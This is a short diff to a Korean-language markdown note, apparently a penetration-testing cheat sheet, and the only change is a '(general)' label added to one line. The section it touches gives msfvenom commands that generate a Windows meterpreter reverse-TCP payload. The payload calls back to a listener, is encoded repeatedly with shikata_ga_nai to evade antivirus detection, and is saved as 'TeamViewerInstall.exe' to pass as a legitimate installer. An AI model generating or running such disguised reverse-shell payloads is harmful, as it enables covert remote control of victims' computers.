@@ -23,7 +23,7 @@
 
 ### 탐지 우회를 위한 반복 Encoding (약간의 효과)
 ```
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+(일반) msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
 ```
 
